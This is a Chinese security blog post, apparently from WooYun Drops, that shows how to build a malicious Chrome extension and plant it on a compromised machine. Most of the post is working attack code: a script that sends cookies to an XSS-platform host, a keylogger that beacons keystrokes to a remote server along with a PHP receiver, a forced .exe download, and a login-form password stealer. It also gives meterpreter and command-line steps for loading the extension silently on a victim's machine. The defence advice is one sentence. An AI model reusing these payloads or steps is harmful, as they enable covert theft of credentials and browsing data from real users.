# Hack With Chrome Extension

0x00 Introduction
=================

* * *

众所周知，Web应用变得越来越流行，生活，办公，娱乐等等很多都是通过Web，而浏览器是我们访问Web最常使用的工具之一。随着Web功能的强大，浏览器的功能也变得越来越强大。而此文，就是介绍一种通过Chrome插件进行攻击的姿势跟手法。

> 撰写此文时，仅对Chrome浏览器进行了部分测试，有兴趣的小伙伴可以深入，本文主要是提供一种思路。

0x01 Write Chrome Extension
===========================

* * *

在知道怎么写插件之前，我们首先了解一下插件的文件结构，随便下载一个谷歌插件,将其重命名为zip后缀之后进行解压，解压后的文件目录如下：

![Alt text](http://drops.javaweb.org/uploads/images/ee4dc69d90f7e19f79f7e20d8e28299672908603.jpg)

其中，manifest.json是主文件，来声明要写的插件的相关信息。可以把mainfest.json理解成插件的入口，即chrome需要通过manifest.json来理解你的插件要引用哪些文件 、 需要哪些权限 、 插件图标 等信息。而其他文件，就是能实现此插件功能的脚本文件以及插件图标等。

下面，我们开始构造我们的hack extension。

首先， 编写manifest.json文件如下:

```
{
    "name": "demo",  //插件显示的名称
    "description": "demo", //插件的描述
    "version": "1.0", //插件的版本
    "manifest_version": 2, //新版chrome强制manifest_version为2
    //插件的图标
    "icons": {  
    "16": "imgs/ico.png",
    "32": "imgs/ico.png",
    "48": "imgs/ico.png",
    "128": "imgs/ico.png"
    },
    //定义后台的一些特性
    "background":{
      "scripts":[  //加载插件的时候执行的脚本
          "js/call.js", 
          "lib/jquery.min.js"
      ]
    },
    "content_scripts": [//定义自动加载的内容
        {
            "matches": [ //满足什么样的条件执行该插件
                "<all_urls>"
            ],
            "js": [
                "lib/jquery.min.js", //满足以后执行的脚本
                "js/check.js"
            ]
        }
    ],
  //插件的权限
  "permissions": [
      "tabs",
      "http://*/",
      "https://*/",
      "background",
      "webRequest",
      "storage",
      "browsingData"
  ]
}

```

创建以下文件：

![Alt text](http://drops.javaweb.org/uploads/images/8ba910195913e9340cd19c7a42fef14b243ce944.jpg)

现在，所有的文件就全了，但是还没什么功能，尝试加载一下插件，浏览器URL栏输入`chrome://extensions/`选择加载已解压的扩展程序，之后选择文件所在的文件夹。

![Alt text](http://drops.javaweb.org/uploads/images/430dbcd3335a0267a088911bdc3c10218f38a64b.jpg)

然后插件就已经被加载上了：

![Alt text](http://drops.javaweb.org/uploads/images/2f0901968928062f5abbb259f9c6f3bb1e3d13bf.jpg)

0x02 How to Hack
================

* * *

插件已经可以被成功加载了，怎么使用它来进行攻击呢，我们开始编写。

### 1、XSS Platform

配置XSS平台，获取项目代码如下：

```
<script src=http://t.cn/xxxxxxx></script>

```

访问http://t.cn/xxxxxx 获取代码，将其写入check.js，内容如下：

```
﻿﻿(function(){(new Image()).src='http://xss9.com/index.php?do=api&id=xxxxxx&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();
if(''==1){keep=new Image();keep.src='http://xss9.com/index.php?do=keepsession&id=xxxxxx&url='+escape(document.location)+'&cookie='+escape(document.cookie)};

```

保存文件，重新加载插件，访问任意网站，获取访问网站的cookie信息，如下图：

![Alt text](http://drops.javaweb.org/uploads/images/321820fb1c0a229eefb9d290b0b3e5aa488ca95f.jpg)

### 2、Keyloger

将以下Payload写入check.js中：

```
$(document).ready(function()
{
    var server = "http://server.com/"; //接收服务器
    var gate = "data.php?data=";  //接收文件
    var tabURL = window.location.href;

            var keys='';
    document.onkeypress = function(e) {
      get = window.event?event:e;
      key = get.keyCode?get.keyCode:get.charCode;
      key = String.fromCharCode(key);
      keys+=key;
    }
    window.setInterval(function(){
      new Image().src = server+gate+keys;
      keys = '';
    }, 1000);        
    });

```

接收php文件如下，将此文件命名为data.php置于服务器上：

```
<?php
$txt = $_GET['data'];
$log = fopen("keylog.txt", "a") or die("Unable to open file!");
fwrite($log, $txt);
fclose($log);
?>

```

> 需要在服务器上建立keylog.txt,然后给777权限就可以了

加载插件以后，键盘记录启动，当用户在网页中进行键盘输入时，输入数据会发送到远程服务器。

![Alt text](http://drops.javaweb.org/uploads/images/bc47e95d8a9f785b65da2804a1fc45965013624b.jpg)

### 3、ForceDownload

强制下载文件Payload如下，此payload即安装插件以后，访问任意网站强制下载程序：

```
$(document).ready(function()
{
    var server = "http://server.com/"; //服务器
    var gate = "/test/test.exe"; //要下载的文件
    var tabURL = window.location.href;

    var link = document.createElement('a');
link.href = server+gate;
link.download = '';
document.body.appendChild(link);
link.click();    
    });

```

### 4、Get Wooyun Password

以下Payload 用于获取登陆wooyun的账号密码。

```
$(document).ready(function()
{
    var server = "http://xss9.com/"; //发送地址
    var gate = "index.php?do=api&id=xxxxx"; //接收参数
    var tabURL = window.location.href;

        if(tabURL.indexOf('wooyun.org') !== -1 )
    {
        wooyun();
    }

    function email()
    {
        var email = document.getElementsByName('email')[0].value;
        var password = document.getElementsByName('password')[0].value;
        var data = "&username="+email+"&password="+password;
        new Image().src = server+gate+data;
        //console.log("email="+email+"&password="+password)
    }
    function wooyun()
    {
        document.getElementById('subbtn').onmouseover = email;
    }    
    });

```

![Alt text](http://drops.javaweb.org/uploads/images/9e27343f2e0ce5c690e4060601479959452e3b4d.jpg)

> 修改payload可针对性获取某网站账号密码信息。

Payload就介绍这么多了，熟悉前端的童鞋一定可以创造更多花式玩儿法。

0x03 When to Use
================

* * *

或许小伙伴们会问，弄这个有什么用，我又不需要装这个插件抓自己的密码。当然，这个肯定不是用来搞自己的。渗透测试过程中，有没有碰到过看到管理员经常使用Chrome浏览器，而我们却没办法获取到其常用密码呢？（管理员并没有使用浏览器记住密码的功能）。这个时候，除了给系统装键盘记录器，我们还可以为其浏览器装我们编写的插件。而这个插件，就可以用来搜集各种敏感信息，而且，针对的是浏览器访问的所有网站！

除此之外，我发现chrome是可以通过命令行来安装插件的，来设想一个场景，我们使用某个漏洞，或者社会工程学获取了小明的计算机控制权，现在已经有了一个meterpreter会话如下：

![Alt text](http://drops.javaweb.org/uploads/images/ef10486f006e0a901f8ae08fa4233c76d5beca19.jpg)

执行如下命令：

```
meterpreter > run post/windows/gather/enum_chrome

```

![Alt text](http://drops.javaweb.org/uploads/images/7be12b3f38e23680f10eb7af3a052de12286b61c.jpg)

可以看到目标系统是安装了chrome浏览器的。

上传插件目录demo到`e:\demo\`目录，由于meterpreter的upload只能上传文件，不能上传文件夹，所以这里需要把demo文件夹打包压缩以后再上传，之后再通过目标系统的解压软件或者自己上传的unrar.exe进行解压，具体操作如下图:

![Alt text](http://drops.javaweb.org/uploads/images/1c2596b2c86e65b20ea08fa96875b7d8057f867b.jpg)

使用如下命令寻找安装的解压软件：

![Alt text](http://drops.javaweb.org/uploads/images/967636228fe203032a7a60f0cb2984669c524a2b.jpg)

之后使用如下命令进行解压并删除压缩包，具体操作如下图：

![Alt text](http://drops.javaweb.org/uploads/images/f03ec5a5a12825818503a8554f28ee3c5f2dabf0.jpg)

之后为chrome添加插件，使用如下命令：

```
"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"  --load-extension="F:\demo\demo" --silent-launch 

```

> 路径为chrome默认安装路径，如果找不到，可以使用dir命令来找，`--load-extension`是要加载的插件路径，`--silent-launch`表示不开启chrome，静默安装。注意：`需要在chrome未运行的情况下才可成功加载插件。`

使用以上命令有现在两点缺点：

缺点一，会有如下提示（过几秒会消失）。

![Alt text](http://drops.javaweb.org/uploads/images/f03ec5a5a12825818503a8554f28ee3c5f2dabf0.jpg)

缺点二，有图标，有提示。

![Alt text](http://drops.javaweb.org/uploads/images/dab8625bd2dff0662fe8a755a33919fe0a276d4b.jpg)

一直在想办法解决以上问题，图标可以换成透明的或者常用的插件图片来解决，另外两个暂时还没解决，详细的chrome命令可以参考这里:[chromium-command-line](http://peter.sh/experiments/chromium-command-line-switches/)，有小伙伴有了解决方案还请不吝赐教。当然也可以尝试写一个小程序来监控chrome，一旦chrome打开，则模拟点击事件点击取消按钮。

> 最好的方式就是可以直接去为他安装插件，然后点了这几个提示之后，之后的使用则不会再次出现提示，这样可以隐藏挺长时间。

然后，我就控制小明的所有访问内容了，就像这个图一样：

![Alt text](http://drops.javaweb.org/uploads/images/321820fb1c0a229eefb9d290b0b3e5aa488ca95f.jpg)

当然除了以上的利用方式，还可以通过发布一些插件让其含有攻击代码同样可以实现此功能。

0x04 How to Defend
==================

* * *

对于不明来历的插件尽量不要安装，如果发现问题，请尽早修改自己各个账号密码。

0x05 Summarize
==============

* * *

此文主要介绍在渗透测试过程中的一种思路，有兴趣的小伙伴可以继续测试其他浏览器的插件，这种方式虽然简单，但是效果还不错，你值得拥有。以上文件可以通过这里下载：[Extension_Backdoor](https://github.com/Ridter/Pentest/tree/master/backdoor/Extension_Backdoor)。

0x06 Consult
============

* * *

1.  [http://peter.sh/experiments/chromium-command-line-switches/#condition-21](http://peter.sh/experiments/chromium-command-line-switches/#condition-21)
2.  [http://www.chromeplugins.org/google/chrome-plugins/installing-crx-file-command-line-9976.html](http://www.chromeplugins.org/google/chrome-plugins/installing-crx-file-command-line-9976.html)
3.  [https://developer.chrome.com/extensions/external_extensions](https://developer.chrome.com/extensions/external_extensions)
4.  [http://www.cnblogs.com/walkingp/archive/2011/03/31/2001628.html](http://www.cnblogs.com/walkingp/archive/2011/03/31/2001628.html)

**本文由evi1cg原创并首发于乌云drops，转载请注明**